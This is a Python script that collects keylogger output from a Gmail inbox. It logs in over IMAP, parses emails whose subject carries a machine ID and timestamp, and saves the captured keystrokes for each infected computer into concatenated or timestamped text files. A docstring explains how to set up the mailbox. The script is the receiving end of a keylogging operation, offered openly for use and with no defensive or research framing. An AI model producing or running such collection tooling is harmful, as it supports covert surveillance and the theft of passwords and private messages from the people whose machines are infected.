"""
Extract Keylogger data from Gmail account into Concat Extracted files (all logged 
keys for a particular machine are concatenated) and 
Timestamp-data Extracted files (logged keys for a particular machine are 
seperated by a Timestamp).

1. Need to enable IMAP in gmail settings

2. Need to enable 2FA and get an app-specific password

"""

# Importing libraries
import imaplib
import email

from datetime import datetime
import os

user = "yourEmail@gmail.com"
password = "yourPassword"

# URL for IMAP connection
imap_url = 'imap.gmail.com'

# Connection with GMAIL using SSL
my_mail = imaplib.IMAP4_SSL(imap_url)

# Log in using your credentials
my_mail.login(user, password)

# Select the Inbox to fetch messages
my_mail.select('Inbox')

_, data = my_mail.search(None, 'ALL')

mail_id_list = data[0].split()  # IDs of all emails that we want to fetch

msgs = []  # empty list to capture all messages
# Iterate through messages and extract data into the msgs list
for num in mail_id_list:
    # RFC822 returns whole message (BODY fetches just body)
    typ, data = my_mail.fetch(num, '(RFC822)')
    msgs.append(data)

# In a multipart e-mail, email.message.Message.get_payload() returns a
# list with one item for each part. The easiest way is to walk the message
# and get the payload on each part:

# NOTE that a Message object consists of headers and payloads.
emailData = {}

for msg in msgs[::-1]:
    for response_part in msg:
        if type(response_part) is tuple:
            my_msg = email.message_from_bytes((response_part[1]))
            computerID, dateTime = my_msg['subject'].split()

            messageData = []

            for part in my_msg.walk():
                if part.get_content_type() == 'text/plain':
                    messageData = [dateTime, part.get_payload()]
            if (computerID not in emailData.keys()):
                emailData[computerID] = []

            emailData[computerID].append(messageData)

# Concatenated Extraction (without individual timestamps)

# get the current time
current_datetime = datetime.now()
formatted_datetime = current_datetime.strftime(
    "Concat Extraction %d-%m-%Y %H %M %S")

workingDirectory = f'{formatted_datetime}\\'

# Create a folder for your extraction
os.mkdir(formatted_datetime)

for computerID in emailData.keys():
    # Initialize an empty list to store the concatenated strings
    concatenated_data = []

    # Iterate through the sub-arrays and concatenate the second element
    for timeDataPair in emailData[computerID]:
        concatenated_data.append(timeDataPair[1])

    # Join the concatenated strings with a space
    result = ' '.join(concatenated_data)

    open(workingDirectory + computerID + ".txt", 'a').write(str(result))


# Timestamp-data Extraction (with individual timestamps)
formatted_datetime = current_datetime.strftime(
    "Timestamp-data Extraction %d-%m-%Y %H %M %S")

workingDirectory = f'{formatted_datetime}\\'

# Create a folder for datetime extractions
os.mkdir(formatted_datetime)

for computerID in emailData.keys():
    # Initialize an empty list to store the concatenated strings
    concatenated_data = []

    result = ''

    for timeDataPair in emailData[computerID]:
        result = result + f'%%%{str(timeDataPair[0])}%%%\n{timeDataPair[1]}\n'

    open(workingDirectory + computerID + ".txt", 'w').write(str(result))
